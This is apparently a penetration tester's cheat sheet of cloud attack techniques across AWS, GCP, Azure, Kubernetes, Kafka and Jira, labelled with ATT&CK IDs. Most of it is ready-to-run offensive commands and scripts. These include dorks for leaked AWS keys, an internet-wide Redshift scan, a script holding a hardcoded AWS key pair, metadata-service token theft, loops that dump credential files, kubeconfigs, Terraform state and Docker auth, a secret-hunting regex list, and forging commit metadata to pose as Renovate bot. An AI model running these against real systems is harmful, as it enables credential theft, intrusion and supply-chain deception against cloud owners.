# Cloud TTPs

## Table of Contents

- [Azure (T1087.004)](#azure-t1087004)
- [AWS (T1552.005)](#aws-t1552005)
  - [Cognito (T1087.004)](#cognito-t1087004)
  - [AWS Trivy Scanning (T1595.002)](#aws-trivy-scanning-t1595002)
  - [SSM (T1021.007)](#ssm-t1021007)
  - [API Gateway (T1190)](#api-gateway-t1190)
- [GCP (T1087.004)](#gcp-t1087004)
- [Cloud Subdomain Takeover (T1584.001)](#cloud-subdomain-takeover-t1584001)
- [Kubernetes Secrets Harvesting (T1552.007)](#kubernetes-secrets-harvesting-t1552007)
- [Kubernetes Service Enumeration (T1046)](#kubernetes-service-enumeration-t1046)
- [Kubernetes Ninja Commands (T1609)](#kubernetes-ninja-commands-t1609)
- [Password Hunting Regex (T1552)](#password-hunting-regex-t1552)
- [Go Environment Variable Enumeration (T1082)](#go-environment-variable-enumeration-t1082)
- [Jira (T1087)](#jira-t1087)
- [Pentesting Kafka (T1046)](#pentesting-kafka-t1046)
- [Post-Exploitation Cloud Credential Harvesting (T1552.001)](#post-exploitation-cloud-credential-harvesting-t1552001)
- [IMDS and Container Credential Theft (T1552.005)](#imds-and-container-credential-theft-t1552005)
- [Kubernetes Service Account Token Theft (T1552.007)](#kubernetes-service-account-token-theft-t1552007)
- [Docker Registry Credential Harvesting (T1552.001)](#docker-registry-credential-harvesting-t1552001)
- [CI/CD and IaC Secret Harvesting (T1552.001)](#cicd-and-iac-secret-harvesting-t1552001)

---

## Azure (T1087.004)

Enumerate for Priv Esc:

```bash
# Login
$ az login -u <user> -p <password>

# Set Account Subscription
$ az account set --subscription "Pay-As-You-Go"

# Enumeration for Priv Esc
$ az ad user list -o table
$ az role assignment list -o table
```

## AWS (T1552.005)

Shodan.io query to enumerate AWS Instance Metadata Service Access

```sh
/latest/meta-data/iam/security-credentials
```

Google Dorking for AWS Access Keys

```sh
inurl:pastebin "AWS_ACCESS_KEY"
```

Recursively searching for AWS Access Keys on *Nix containers

```bash
grep -ER "AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}" /
```

S3 Log Google Dorking

```sh
s3 site:amazonaws.com filetype:log
```

Public Redshift Cluster Enumeration

```sh
sudo masscan 0.0.0.0/0 --exclude 255.255.255.255 -p5439 --rate=1000 -oG - 2>/dev/null | grep "Ports: 5439/open" | awk '{print $2}' | tee open_5439_ips.txt | xargs -r -n1 -P5 -I{} nmap -p 5439 --script ssl-cert {} | grep -i redshift
```

Python code to check if AWS key has permissions to read s3 buckets:

```python
import boto3
import json

aws_access_key_id = 'AKIAQYLPMN5HIUI65MP3'
aws_secret_access_key = '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'
region = 'us-east-2'

session = boto3.Session(
    aws_access_key_id=aws_access_key_id,
    aws_secret_access_key=aws_secret_access_key,
    region_name=region
)

s3 = session.resource('s3')

try:
    response = []
    for bucket in s3.buckets.all():
        response.append(bucket.name)
    print(json.dumps(response))
except Exception as e:
    print(f"Error: {e}")
```

Find S3 Buckets Using Subfinder and HTTPX Tool

```sh
subfinder -d <TARGET_DOMAIN> -all -silent | httpx -silent -webserver -threads 100 | grep -i AmazonS3
```

### Cognito (T1087.004)

> [!NOTE]
> Before proceeding, capture the session's JWT during login and save to a file (ex: `access_token.txt`)
> This can be accomplished using your browser developer tools or another method

1. Get user information:

```sh
aws cognito-idp get-user --access-token $(cat access_token.txt)
```

2. Test admin authentication:

```sh
aws cognito-idp admin-initiate-auth --access-token $(cat access_token)
```

3. List user groups:

```sh
aws cognito-idp admin-list-groups-for-user \
  --username user.name@email.com \
  --user-pool-id "Group-Name"
```

4. Attempt sign up

```sh
aws cognito-idp sign-up --client-id <client-id> --username <username> --password <password>
```

5. Modify attributes

```sh
aws cognito-idp update-user-attributes --access-token $(cat access_token) --user-attributes Name=<attribute>,Value=<value>
```

### AWS Trivy Scanning (T1595.002)

1. Install the Trivy AWS plugin: `trivy plugin install github.com/aquasecurity/trivy-aws`

2. Scan a full AWS account (all supported services):

```sh
trivy aws --region us-east-1
```

3. Scan a specific service:

```sh
trivy aws --service s3
```

4. Show results for a specific AWS resource:

```sh
trivy aws --service s3 --arn arn:aws:s3:::example-bucket
```

### SSM (T1021.007)

Script to quickly enumerate and select AWS SSM-managed EC2 instances via `fzf`, then start an SSM session without needing SSH or public access.

```sh
#!/bin/zsh

function main() {
  if ! command -v fzf >/dev/null || ! command -v aws >/dev/null; then
    echo "This function requires 'aws' CLI and 'fzf' to be installed." >&2
    return 1
  fi

  echo -e "Fetching SSM instances..."

  local instances
  instances=$(aws ssm describe-instance-information \
    --query "InstanceInformationList[*].[InstanceId,ComputerName]" \
    --output text)

  if [[ -z "$instances" ]]; then
    echo "No SSM-managed instances found." >&2
    return 1
  fi

  # Extract Instance IDs
  local ids=()
  while read -r id _; do
    ids+=("$id")
  done <<< "$instances"

  # Get Name tags for all instance IDs
  local name_data
  name_data=$(aws ec2 describe-instances \
    --instance-ids "${ids[@]}" \
    --query "Reservations[].Instances[].{InstanceId:InstanceId, Name:(Tags[?Key=='Name']|[0].Value)}" \
    --output text)

  declare -A name_map
  while read -r id name; do
    name_map["$id"]="${name:-N/A}"
  done <<< "$name_data"

  # Combine data with aligned formatting
  local enriched
  enriched=$(while read -r line; do
    id=$(awk '{print $1}' <<< "$line")
    hostname=$(awk '{print $2}' <<< "$line")
    platform=$(awk '{print $3}' <<< "$line")
    name="${name_map[$id]:-N/A}"
    printf "%-30s %-20s %-30s\n" "$name" "$id" "$hostname"
  done <<< "$instances")

  # Dynamically size the FZF selection window based on amount of instances
  local line_count
  line_count=$(echo "$enriched" | wc -l)

  local height
  if (( line_count < 10 )); then
    height=30
  elif (( line_count < 20 )); then
    height=50
  else
    height=80
  fi

  local selected instance_id
  selected=$(echo "$enriched" | fzf --header="Select an instance to connect via SSM" --height="${height}%" --reverse)
  instance_id=$(awk '{print $2}' <<< "$selected")

  if [[ -n "$instance_id" ]]; then
    echo "Starting SSM session to $instance_id..." >&2
    aws ssm start-session --target "$instance_id"
  else
    echo "No instance selected." >&2
    return 1
  fi
}

main
```

Parameter Store:

Lists the parameters in the AWS account or the parameters shared with the authenticated user (secrets can be stored here):

```sh
aws ssm describe-parameters
```

### API Gateway (T1190)

AWS API Gateway is a service offered by Amazon Web Services (AWS) designed for developers to create, publish, and oversee APIs on a large scale. It functions as an entry point to an application, permitting developers to establish a framework of rules and procedures. This framework governs the access external users have to certain data or functionalities within the application.

Enumeration:

```sh
# Generic info
aws apigatewayv2 get-domain-names
aws apigatewayv2 get-domain-name --domain-name <name>
aws apigatewayv2 get-vpc-links

# Enumerate APIs
aws apigatewayv2 get-apis # This will also show the resource policy (if any)
aws apigatewayv2 get-api --api-id <id>

## Get all the info from an api at once
aws apigatewayv2 export-api --api-id <id> --output-type YAML --specification OAS30 /tmp/api.yaml

## Get stages
aws apigatewayv2 get-stages --api-id <id>

## Get routes
aws apigatewayv2 get-routes --api-id <id>
aws apigatewayv2 get-route --api-id <id> --route-id <route-id>

## Get deployments
aws apigatewayv2 get-deployments --api-id <id>
aws apigatewayv2 get-deployment --api-id <id> --deployment-id <dep-id>

## Get integrations
aws apigatewayv2 get-integrations --api-id <id>

## Get authorizers
aws apigatewayv2 get-authorizers --api-id <id>
aws apigatewayv2 get-authorizer --api-id <id> --authorizer-id <uth-id>

## Get domain mappings
aws apigatewayv2 get-api-mappings --api-id <id> --domain-name <dom-name>
aws apigatewayv2 get-api-mapping --api-id <id> --api-mapping-id <map-id> --domain-name <dom-name>

## Get models
aws apigatewayv2 get-models --api-id <id>

## Call API
https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<resource>
```

## GCP (T1087.004)

Enumerate IP addresses:

```sh
#!/bin/bash

# Function to list all projects in the organization
list_all_projects() {
  gcloud projects list --format="value(projectId)"
}

# Function to check if a specific API is enabled for a project
is_api_enabled() {
  local project=$1
  local api=$2
  gcloud services list --project="$project" --filter="name:$api" --format="value(name)"
}

# Function to list all instances in a given project
list_instances() {
  local project=$1
  gcloud compute instances list --project="$project" --format="json"
}

# Main function
main() {
  # Create or clear the files to store public IPs
  output_file="public_ips.txt"
  ip_only_file="ip_addresses.txt"
  : > "$output_file"
  : > "$ip_only_file"

  # Get the list of all projects
  projects=$(list_all_projects)
  for project in $projects; do
    echo "Processing Project: $project"

    # Check if Resource Manager API is enabled for the project
    if [[ -z "$(is_api_enabled "$project" "cloudresourcemanager.googleapis.com")" ]]; then
      echo "Resource Manager API is not enabled for project $project. Skipping..."
      continue
    fi

    # Check if Compute Engine API is enabled for the project
    if [[ -z "$(is_api_enabled "$project" "compute.googleapis.com")" ]]; then
      echo "Compute Engine API is not enabled for project $project. Skipping..."
      continue
    fi

    # Get the list of all instances in the current project
    instances=$(list_instances "$project")

    # Check if there are any instances
    if [[ "$instances" != "[]" ]]; then
      # Loop through each instance and extract public IPs
      for instance in $(echo "$instances" | jq -r '.[] | @base64'); do
        _jq() {
          echo "$instance" | base64 --decode | jq -r "$1"
        }
        instance_name=$(_jq '.name')
        zone=$(_jq '.zone' | awk -F/ '{print $NF}')
        public_ips=$(_jq '.networkInterfaces[].accessConfigs[]?.natIP')

        # Check if there is a public IP and write to the output files
        if [[ -n "$public_ips" ]]; then
          for ip in $public_ips; do
            echo "$project,$zone,$instance_name,$ip" >> "$output_file"
            echo "$ip" >> "$ip_only_file"
          done
        fi
      done
    fi
  done

  echo "Public IPs have been written to $output_file"
  echo "IP addresses have been written to $ip_only_file"
}

# Execute main function
main
```

SSRF URL:

```sh
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
    echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
    echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

## Cloud Subdomain Takeover (T1584.001)

```python
import requests
from bs4 import BeautifulSoup
import dns.resolver
import argparse
from tqdm import tqdm

parser = argparse.ArgumentParser(
    description='Query crt.sh and perform a DNS lookup.')
parser.add_argument('domain', help='The domain to query.')
args = parser.parse_args()

response = requests.get(f"https://crt.sh/?q={args.domain}")
soup = BeautifulSoup(response.text, 'html.parser')
domain_names = [td.text for td in soup.find_all('td') if not td.attrs]

for domain in tqdm(domain_names, desc="Checking for subdomain takeovers"):
    # Skip invalid and wildcard domains
    if '*' in domain or len(domain) > 253 or any(len(label) > 63 for label in domain.split('.')):
        continue

    # Identify cloud services and check for potential subdomain takeovers
    try:
        answers = dns.resolver.resolve(domain, 'CNAME')
        for rdata in answers:
            cname = str(rdata.target)
            if '.amazonaws.com' in cname:
                response = requests.get(f"http://{domain}")
                if response.status_code in [403, 404]:
                    print(
                        f"Potential Amazon S3 bucket for subdomain takeover: {domain}")
            elif '.googleapis.com' in cname:
                response = requests.get(f"http://{domain}")
                if response.status_code in [403, 404]:
                    print(
                        f"Potential Google Cloud Storage bucket for subdomain takeover: {domain}")
            elif '.blob.core.windows.net' in cname:
                response = requests.get(f"http://{domain}")
                if response.status_code == 404:
                    print(
                        f"Potential Azure blob storage for subdomain takeover: {domain}")
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.YXDOMAIN, dns.resolver.NoNameservers):
        continue
```

## Kubernetes Secrets Harvesting (T1552.007)

```bash
curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
```

## Kubernetes Service Enumeration (T1046)

You can find everything exposed to the public with:

```sh
kubectl get namespace -o custom-columns='NAME:.metadata.name' | grep -v NAME | while IFS='' read -r ns; do
    echo "Namespace: $ns"
    kubectl get service -n "$ns"
    kubectl get ingress -n "$ns"
    echo "=============================================="
    echo ""
    echo ""
done | grep -v "ClusterIP"
```

## Kubernetes Ninja Commands (T1609)

```bash
# List all pods in the current namespace.
kubectl get pods

# Get detailed information about a pod.
kubectl describe pod <pod-name>

# Create a new pod.
kubectl create pod <pod-name>

# List all nodes in the cluster.
kubectl get nodes

# Get detailed information about a node.
kubectl describe node <node-name>

# Create a new node
kubectl create node <node-name>

# List all services in the cluster.
kubectl get services

# Get detailed information about a service.
kubectl describe service <service-name>

# Create a new service.
kubectl create service <service-name>

# List all secrets in the cluster.
kubectl get secrets

# Get detailed information about a secret.
kubectl describe secret <secret-name>

# Create a new secret.
kubectl create secret <secret-name>
```

## Password Hunting Regex (T1552)

```yaml
“Slack Token”: “(xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})”
“RSA Private Key”: “—–BEGIN RSA PRIVATE KEY—–”
“SSH (DSA) Private Key”: “—–BEGIN DSA PRIVATE KEY—–”
“SSH (EC) Private Key”: “—–BEGIN EC PRIVATE KEY—–”
“PGP Private Key Block”: “—–BEGIN PGP PRIVATE KEY BLOCK—–”
“AWS API Key”: “(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}”
“Amazon MWS Auth Token”: “amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}”
“AWS AppSync GraphQL Key”: “da2-[a-z0-9]{26}”
“Facebook Access Token”: “EAACEdEose0cBA[0-9A-Za-z]+”
“Facebook OAuth”: “[fF][aA][cC][eE][bB][oO][oO][kK].[’|"][0-9a-f]{32}[’|"]”
“GitHub Token”: “[gG][iI][tT][hH][uU][bB].[’|"][0-9a-zA-Z]{35,40}[’|"]”
“Generic API Key”: “[aA][pP][iI]?[kK][eE][yY].[’|"][0-9a-zA-Z]{32,45}[’|"]”
“Generic Secret”: “[sS][eE][cC][rR][eE][tT].[’|"][0-9a-zA-Z]{32,45}[’|"]”
“Google API Key”: “AIza[0-9A-Za-z-]{35}”
“Google OAuth Client ID”: “[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com”
“Google Service Account”: “"type":\s*"service_account"”
“Google OAuth Access Token”: “ya29\.[0-9A-Za-z-]+”
“Heroku API Key”: “[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}”
“MailChimp API Key”: “[0-9a-f]{32}-us[0-9]{1,2}”
“Mailgun API Key”: “key-[0-9a-zA-Z]{32}”
“Password in URL”: “[a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@.{1,100}["’\s]”
“PayPal Braintree Access Token”: “access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}”
“Picatic API Key”: “sk_live[0-9a-z]{32}”
“Slack Webhook”: “https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}”
“Stripe API Key”: “sk_live_[0-9a-zA-Z]{24}”
“Stripe Restricted API Key”: “rk_live_[0-9a-zA-Z]{24}”
“Stripe Publishable Key”: “pk_live_[0-9a-zA-Z]{24}”
“Square Access Token”: “sq0atp-[0-9A-Za-z-]{22}”
“Square OAuth Secret”: “sq0csp-[0-9A-Za-z-]{43}”
“Telegram Bot API Key”: “[0-9]+:AA[0-9A-Za-z-]{33}”
“Twilio API Key”: “SK[0-9a-fA-F]{32}”
“Twitter Access Token”: “[tT][wW][iI][tT][tT][eE][rR].[1-9][0-9]+-[0-9a-zA-Z]{40}”
“Twitter OAuth”: “[tT][wW][iI][tT][tT][eE][rR].[’|"][0-9a-zA-Z]{35,44}[’|"]”
“OpenAI API Key”: “sk-[A-Za-z0-9]{48}”
“GitLab Personal Access Token”: “glpat-[A-Za-z0-9-]{20,}”
“GitLab Runner Registration Token”: “GR[A-Za-z0-9-]{20,}”
“HashiCorp Terraform Cloud Token”: “tfrc-[A-Za-z0-9]{59}”
“Cloudflare API Token”: “cf-[A-Za-z0-9]{37}”
“Databricks Personal Access Token”: “dapi[a-f0-9]{32}”
“DigitalOcean Personal Access Token”: “dop_v1[A-Za-z0-9]{64}”
“Vault HCP Token”: “hvs\.[A-Za-z0-9]{24}”
“Azure Storage SAS Token”: “sv=\d{4}-\d{2}-\d{2}&sig=[A-Za-z0-9%]{64}”
“New Relic License Key”: “NRAK-[A-F0-9]{27}”
“Bitbucket App Password in URL”: “https://[A-Za-z0-9_-]+:[A-Za-z0-9_-]{20}@bitbucket\.org”
“Generic JWT”: “[A-Za-z0-9-]{20,}\.[A-Za-z0-9-]{20,}\.[A-Za-z0-9-_]{20,}”
 ```

## Go Environment Variable Enumeration (T1082)

A sample script that enumerates environment variables. This script pairs well with the regex list provided above:

```go
package main

import (
 "fmt"
 "os"
 "strings"
)

func main() {
 sensitiveKeywords := []string{"password", "secret", "key", "token", "api", "auth", "credential"}

 envVars := os.Environ()
 for _, e := range envVars {
  envLower := strings.ToLower(e)
  for _, keyword := range sensitiveKeywords {
   if strings.Contains(envLower, keyword) {
    fmt.Printf("SENSITIVE: %s\n", e)
    break
   }
  }
 }
}
```

## Jira (T1087)

### Privileges

In Jira, privileges can be checked by any user, authenticated or not, through the endpoints `/rest/api/2/mypermissions` or `/rest/api/3/mypermissions`. These endpoints reveal the user's current privileges.

```sh
# Check non-authenticated privileges
curl https://org.atlassian.net/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
```

## Pentesting Kafka (T1046)

Use Nmap to detect Kafka brokers and check for open ports:

```sh
nmap -p 9092,9093,2181 -sV target.com
```

List brokers via `kafkacat`:

```sh
❯ kcat -b target.com -L
Metadata for all topics (from broker -1: target.com:9092/bootstrap):
 1 brokers:
  broker 1 at target.com:9092 (controller)
 3 topics:
  topic "RemoteMonitoringConnectedDevices" with 1 partitions:
    partition 0, leader 1, replicas: 1, isrs: 1
  topic "AlertNotifications" with 1 partitions:
    partition 0, leader 1, replicas: 1, isrs: 1
  topic "__consumer_offsets" with 50 partitions:
```

Enumerating brokers script:

```sh
#!/usr/bin/env bash

TARGET=$1
PORT=${2:-9092}

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target.com>"
  exit 1
fi

# Read all topics
for topic in $(kcat -b $TARGET:$PORT -L | grep topic | awk '{print $2}' | sed 's/"//g'); do
  echo "[*] Topic: $topic"
  kcat -b $TARGET:$PORT -t $topic -C -c 10
done
```

Save messages for offline analysis;

```sh
kcat -b target.com:9092 -t AlertNotifications -C -J | jq . > messages.json
```

## Post-Exploitation Cloud Credential Harvesting (T1552.001)

After gaining access to a host, cloud provider credentials are often stored in well-known file paths. The following enumerates credential files across AWS, GCP, and Azure for all users on the system:

```bash
# AWS credentials and config
for home in /home/* /root; do
  for f in "$home/.aws/credentials" "$home/.aws/config"; do
    [ -f "$f" ] && echo "=== $f ===" && cat "$f"
  done
done

# AWS credential environment variables
env | grep -E "^AWS_"

# GCP application default credentials and service account keys
for home in /home/* /root; do
  find "$home/.config/gcloud" -type f 2>/dev/null | while read -r f; do
    echo "=== $f ===" && cat "$f"
  done
done
cat "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null
env | grep -iE "(GOOGLE|GCLOUD)"

# Azure credential files
for home in /home/* /root; do
  find "$home/.azure" -type f 2>/dev/null | while read -r f; do
    echo "=== $f ===" && cat "$f"
  done
done
env | grep -i AZURE
```

## IMDS and Container Credential Theft (T1552.005)

Cloud instance metadata services (IMDS) and container credential endpoints expose temporary credentials. These are commonly targeted after gaining code execution inside a cloud workload:

```bash
# AWS EC2 IMDS v1 - List available IAM roles then fetch temporary credentials
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# AWS ECS container credentials (uses task role URI from environment)
curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"

# GCP - Fetch access token from metadata server
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure IMDS - Fetch managed identity token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Kubernetes Service Account Token Theft (T1552.007)

Kubernetes pods are provisioned with service account tokens that can be used to authenticate to the API server. Common mount paths vary between container runtimes:

```bash
# Standard service account token mount paths
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/token

# Service account CA certificate and namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubeconfig files across user home directories
for home in /home/* /root; do
  [ -f "$home/.kube/config" ] && echo "=== $home/.kube/config ===" && cat "$home/.kube/config"
done

# Cluster admin and component configs
for f in /etc/kubernetes/admin.conf \
         /etc/kubernetes/kubelet.conf \
         /etc/kubernetes/controller-manager.conf \
         /etc/kubernetes/scheduler.conf; do
  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
done

# Enumerate all mounted secrets
find /var/secrets /run/secrets -type f 2>/dev/null | while read -r f; do
  echo "=== $f ===" && cat "$f" 2>/dev/null
done

# Dump secrets via kubectl if accessible
kubectl get secrets --all-namespaces -o json 2>/dev/null
```

## Docker Registry Credential Harvesting (T1552.001)

Docker stores registry authentication tokens in config files that can be used to pull or push images to private registries:

```bash
# User Docker configs
for home in /home/* /root; do
  [ -f "$home/.docker/config.json" ] && echo "=== $home/.docker/config.json ===" && cat "$home/.docker/config.json"
done

# Kaniko builder credentials (common in CI/CD pipelines)
cat /kaniko/.docker/config.json 2>/dev/null
```

## CI/CD and IaC Secret Harvesting (T1552.001)

Terraform state files, variable files, and CI/CD configuration files frequently contain plaintext credentials, API keys, and infrastructure secrets:

```bash
# Terraform variable files (may contain cloud credentials, database passwords)
find / -name "*.tfvars" -type f 2>/dev/null -exec sh -c 'echo "=== {} ===" && cat "{}"' \;

# Terraform state files (contain full resource attributes including secrets)
find / -name "terraform.tfstate" -type f 2>/dev/null -exec sh -c 'echo "=== {} ===" && cat "{}"' \;

# CI/CD configuration files
for f in .gitlab-ci.yml .travis.yml Jenkinsfile .drone.yml; do
  [ -f "$f" ] && echo "=== $f ===" && cat "$f"
done

# Ansible configuration (may reference vault passwords)
cat ansible.cfg 2>/dev/null

# Helm chart values (may contain secrets)
for home in /home/* /root; do
  find "$home/.helm" -type f 2>/dev/null | while read -r f; do
    echo "=== $f ===" && cat "$f"
  done
done
```

## GitLab TruffleHog Secret Scanning (T1552.001)

```sh
trufflehog gitlab --token=$(skate get GITLAB_PAT) --endpoint="https://gitlab.com/MYORG" --only-verified -j > findings.json
```

## GitHub TruffleHog Secret Scanning (T1552.001)

Down and dirty scanning for all repos in a GitHub org for verified secrets using TruffleHog. Clones over SSH, no PAT needed for repo access, just an SSH key with org permissions.

```bash
#!/usr/bin/env bash
set -euo pipefail

for cmd in gh git trufflehog; do
  if ! command -v "$cmd" &>/dev/null; then
    echo "Error: $cmd is not installed" >&2
    exit 1
  fi
done

RESULTS_DIR="trufflehog-results"
ORG="YOUR_ORG"
mkdir -p "$RESULTS_DIR"

REPOS=()
while IFS= read -r line; do
  REPOS+=("$line")
done < <(gh repo list "$ORG" --limit 1000 --json name -q '.[].name')

for repo in "${REPOS[@]}"; do
  echo "Scanning $repo..."
  if git clone --quiet git@github.com:"$ORG"/"$repo".git; then
    trufflehog filesystem --only-verified "$repo" > "$RESULTS_DIR/$repo.txt" 2>&1
    rm -rf "$repo"
  else
    echo "Warning: failed to clone $repo, skipping" >&2
  fi
done

echo "Results saved to $RESULTS_DIR/"
```

## GitHub Fork Commit Reachability & Metadata Spoofing

GitHub's architecture makes any commit pushed to a fork reachable by SHA from the parent repository — `victim/repo/commit/<SHA>` resolves even if the commit only exists in `attacker/repo`. Combined with Git's unauthenticated author/committer fields, an attacker can forge commits that appear to originate from trusted automation like Renovate bot, reference them under the parent repo's namespace, and exploit the GitHub UI's lack of fork attribution to lend credibility in social engineering or supply chain attacks.

```bash
GIT_AUTHOR_NAME="renovate[bot]" \
GIT_AUTHOR_EMAIL="29139614+renovate[bot]@users.noreply.github.com" \
GIT_AUTHOR_DATE="Wed Apr 1 18:51:43 2026 +0000" \
GIT_COMMITTER_NAME="GitHub" \
GIT_COMMITTER_EMAIL="noreply@github.com" \
GIT_COMMITTER_DATE="Wed Apr 1 18:51:43 2026 +0000" \
git commit --no-gpg-sign -m "fix(deps): update module golang.org/x/text to v0.35.0"
```
